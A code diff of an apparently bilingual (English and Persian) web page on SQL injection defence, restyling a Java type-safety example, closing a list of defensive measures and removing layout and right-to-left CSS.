-  <div class="font-semibold text-gray-200 mb-1">Type Safety</div>
-  <pre class="bg-slate-900 rounded p-3 text-gray-100 mb-4 text-sm whitespace-pre-wrap">
-// For numeric IDs, parse early
+  
+  <div class="content-label">Type Safety</div>
+  <pre class="code-block">// For numeric IDs, parse early
 int id = Integer.parseInt(request.getParameter("id"));
-// This will throw NumberFormatException for SQLi attempts
-  </pre>
-  <div class="text-gray-400 text-xs mb-2" dir="rtl" style="text-align: right;">
+// This will throw NumberFormatException for SQLi attempts</pre>
+  
+  <div class="content-note" dir="rtl">
     استفاده از تایپ صحیح برای ورودی‌ها (مانند تبدیل به عدد) باعث جلوگیری از تزریق SQL و خطاهای ناخواسته می‌شود.
   </div>
 </div>
@@ -322,7 +328,8 @@ int id = Integer.parseInt(request.getParameter("id"));
     <li>پیاده‌سازی قوانین WAF برای الگوهای تزریق SQL</li>
     <li>مانیتورینگ فعالیت‌های مشکوک دیتابیس</li>
     <li>انجام تست‌های امنیتی و بازبینی کد به صورت منظم</li>
-  </ul></div>
+  </ul>
+</div>
   <h2 class="text-3xl font-bold text-white mb-4">Additional Resources & References</h2>
   <div class="bg-slate-800 rounded-xl p-6 mb-6">
     <div class="text-lg font-bold text-yellow-400 mb-2">Learning Resources</div>
@@ -342,33 +349,3 @@ int id = Integer.parseInt(request.getParameter("id"));
   </div>
 </div>
 </MainLayout>
-
-<style>
-  /* Ensure consistent card heights in grid */
-  @media (min-width: 768px) {
-    .grid > div {
-      display: flex;
-      flex-direction: column;
-    }
-    .grid > div > *:last-child {
-      margin-top: auto;
-    }
-  }
-  
-  /* Better RTL support */
-  [dir="rtl"] {
-    text-align: right;
-    font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;
-  }
-  
-  /* Smooth scrolling for anchor links */
-  html {
-    scroll-behavior: smooth;
-  }
-  
-  /* Better pre tag wrapping */
-  pre {
-    white-space: pre-wrap;
-    word-wrap: break-word;
-  }
-</style>
